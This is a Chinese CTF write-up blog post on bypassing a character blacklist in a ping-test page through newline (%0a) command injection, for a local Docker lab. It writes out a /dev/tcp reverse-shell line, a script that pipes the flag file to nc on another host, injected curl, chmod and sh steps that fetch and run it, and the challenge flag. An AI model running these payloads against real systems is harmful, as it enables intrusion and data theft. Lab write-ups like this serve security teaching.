#  【CTFer成长之路】命令执行RCE   
原创 儒道易行  儒道易行   2025-05-14 12:01  
  
# 命令执行RCE  
## 「死亡ping命令」  
  
**「题目描述:」**  
  
路由器管理台经常存在的网络ping测试，开发者常常会禁用大量的恶意字符串，试试看如何绕过呢？  
  
**「docker-compose.yml」**  
```
version: "3.2"

services:
  converter:
    image: registry.cn-hangzhou.aliyuncs.com/n1book/web-command:latest
    ports:
      - 80:80

```  
  
**「启动方式」**  
```
docker-compose up -d

```  
  
**「题目Flag」**  
```
n1book{6fa82809179d7f19c67259aa285a7729}

```  
  
**「Writeup」**  
  
通过测试可以发现是存在一些黑名单过滤的，被拦截时候显示IP包含恶意字符。  
  
利用fuzz的方式能够知道过滤了以下字符:  
```
["$", "{", "}", "`", ";", "&", "|", "(", ")", "\"", "'", "~", "!", "@", "#", "%", "^", "*", "[", "]", "\\", ":", "-", "_"];

```  
  
通过%0a能够注入新的一条命令进行执行。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpySibic3KkPVMEFTJyYwJCBUVFibibvUMDRMlWlCTvuxYLv10ogYy0l2tSicA3yHtY9uAlmMFZVqicAbtHA/640?wx_fmt=png&from=appmsg "")  
  
由于docker是没有bash、python程序的，并且sh反弹是不行的。  
```
bash -i >& /dev/tcp/127.0.0.1/8080 0>&1

```  
  
关闭防火墙  
  
新建1.sh文件，内容为：  
```
ls
cat /FLAG | nc 192.168.10.3 8080

```  
  
目前是能通过折中的方式执行任意命令  
  
请求bash文件到tmp目录  
```
127.0.0.1%0acurl 192.168.10.3/1.sh > /tmp/1.sh

```  
  
结果如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpySibic3KkPVMEFTJyYwJCBUVgmVFxT3SKywhJkZMy9SKqstvZe6dZ9siarkyKYiafRvRMSyaLOKPGNPA/640?wx_fmt=png&from=appmsg "")  
  
给bash加权限  
```
127.0.0.1%0achmod 777 /tmp/1.sh

```  
  
结果如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpySibic3KkPVMEFTJyYwJCBUVdqMicBOLsh835beSmPj3AXiaBf16kTBlUrfwqsItfia3wWk3a8xR5UM4A/640?wx_fmt=png&from=appmsg "")  
  
执行bash文件  
```
127.0.0.1%0ash /tmp/1.sh

```  
  
结果如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpySibic3KkPVMEFTJyYwJCBUVNTDvXYicnAGtkDric5CePF2hpEw485F2sDhia662cEI9L6VzYAjHIBZbA/640?wx_fmt=png&from=appmsg "")  
  
192.168.10.3机器上进行监听8080端口  
```
nc -l 8080

```  
  
结果如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpySibic3KkPVMEFTJyYwJCBUVJYDp7xZojhHI5JUlB4ib7wFI3WERU0ibah4GSaNeY1FDRTkic3bPQx7uw/640?wx_fmt=png&from=appmsg "")  
  
得到flag  
```
n1book{6fa82809179d7f19c67259aa285a7729}

```  
## 「攻防交流群」  
  
![img](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpySibic3KkPVMEFTJyYwJCBUVyqIUZZEzEPug5Z6qUoFmfhVKWgVaMNqXJqjKv230wbYLbxot7l6a5Q/640?wx_fmt=jpeg&from=appmsg "")  
## 「声明」  
  
文笔生疏，措辞浅薄，望各位大佬不吝赐教，万分感谢。  
  
免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。  
  
转载声明：儒道易行 拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。  
  
